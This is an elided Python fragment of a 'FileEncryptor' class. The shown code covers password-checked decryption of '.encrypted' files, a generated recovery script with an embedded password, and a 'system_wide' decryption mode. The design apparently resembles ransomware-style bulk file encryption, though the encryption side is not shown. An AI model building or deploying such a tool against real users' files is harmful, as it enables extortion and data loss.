...
class FileEncryptor:
    ...
    def decrypt_file(self, encrypted_path, output_path=None):
        ...
        try:
            ...
            # Remove padding (VALIDATED - wrong password or corruption must not
            # destroy the only encrypted copy)
            pad_length = plaintext[-1] if plaintext else 0
            if pad_length < 1 or pad_length > 16 or plaintext[-pad_length:] != bytes([pad_length]) * pad_length:
                raise ValueError("invalid padding - wrong password or corrupt file (encrypted original kept)")
...
============================================="""
        ...
        # Also create recovery script (password embedded base64 so quotes/$
        # backticks in the random password cannot break the generated script)
    ...
    def execute_decryption(self, target_path=None, password=None, mode=None):
        ...
        try:
            ...
            if mode == "system_wide":
                ...
                if os.path.isfile(target_path):
                    # single-file decrypt (target may be one .encrypted file)
                    if target_path.endswith('.encrypted'):
                        try:
                            if self.decrypt_file(target_path):
                                decrypted_count += 1
                                total_count = 1
                                print(f"[+] Decrypted: {target_path}")
                        except Exception as e:
                            print(f"[!] Failed to decrypt {target_path}: {e}")
                    else:
                        return "[!] Target is a file but not .encrypted"
                else:
